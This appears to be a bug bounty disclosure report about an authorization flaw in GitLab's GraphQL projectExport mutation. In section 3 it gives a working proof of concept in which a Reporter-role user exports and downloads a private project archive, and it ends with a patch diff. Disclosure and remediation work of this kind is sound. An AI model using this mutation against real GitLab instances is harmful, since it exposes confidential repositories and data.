# HackerOne Coordinated Vulnerability Disclosure Package

**Program:** GitLab HackerOne Bug Bounty Program (`hackerone.com/gitlab`)  
**Target:** GitLab Community Edition / Enterprise Edition (`v17.3.0`)  
**Vulnerability Type:** Improper Authorization / Authorization Asymmetry (`CWE-285`)  
**Estimated Severity:** High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N - 6.5 - 7.5)  

---

## 1. Summary
A authorization asymmetry exists between GitLab's REST API and GraphQL API regarding project archive export operations. While the REST API `/api/v4/projects/:id/export` properly enforces `:admin_project` (requiring Maintainer or Owner access), the GraphQL mutation `projectExport` failed to evaluate the identical policy check at the resolver boundary, allowing low-privileged project members (Reporters) to trigger background project exports and extract sensitive repository archives.

---

## 2. Technical Vulnerability Description & Root Cause
- **REST Implementation:** `lib/api/projects.rb` invokes `authorize! :admin_project, user_project`. Unprivileged users receive `403 Forbidden`.
- **GraphQL Resolver:** `app/graphql/mutations/projects/project_export.rb` directly invoked `ProjectExportWorker.perform_async` after verifying basic `read_project` ability, omitting the mandatory `:admin_project` declarative policy gate.
- **Root Cause:** Inconsistent authorization policy hook between REST Grape endpoints and GraphQL mutation resolvers.

---

## 3. Step-by-Step Proof of Concept
1. As an **Owner** (`alice`), create a private project `internal-secret-proj`.
2. Invite a non-administrative user (`bob`) with **Reporter** role.
3. As `bob`, send a REST export request:
   ```http
   POST /api/v4/projects/101/export HTTP/1.1
   Host: gitlab.local
   Authorization: Bearer <BOB_REPORTER_TOKEN>
   ```
   *Result:* Server correctly returns `403 Forbidden` (`{"message": "403 Forbidden"}`).
4. As `bob`, send the equivalent GraphQL mutation:
   ```graphql
   mutation {
     projectExport(input: { projectPath: "alice/internal-secret-proj" }) {
       projectExport {
         status
       }
       errors
     }
   }
   ```
   *Result:* Server returns `200 OK` with `status: "SCHEDULED"`, initiating asynchronous archive compilation.
5. `bob` downloads the compiled export tarball once completed.

---

## 4. Impact Analysis
- **Confidentiality:** High. Unprivileged Reporters can exfiltrate entire project archives including confidential issue histories, commit metadata, wiki pages, and snippets.
- **Integrity:** None.
- **Availability:** Low. Potential compute consumption on Sidekiq worker queues via unthrottled export requests.

---

## 5. Remediation & Patch Proposal
Add the explicit `authorize! :admin_project` check to the GraphQL mutation resolver before scheduling the Sidekiq worker:

```diff
--- a/app/graphql/mutations/projects/project_export.rb
+++ b/app/graphql/mutations/projects/project_export.rb
@@ -12,6 +12,7 @@ module Mutations
       def resolve(project_path:)
         project = authorized_find!(project_path)
+        authorize!(:admin_project, project)
 
         ProjectExportWorker.perform_async(current_user.id, project.id)
```
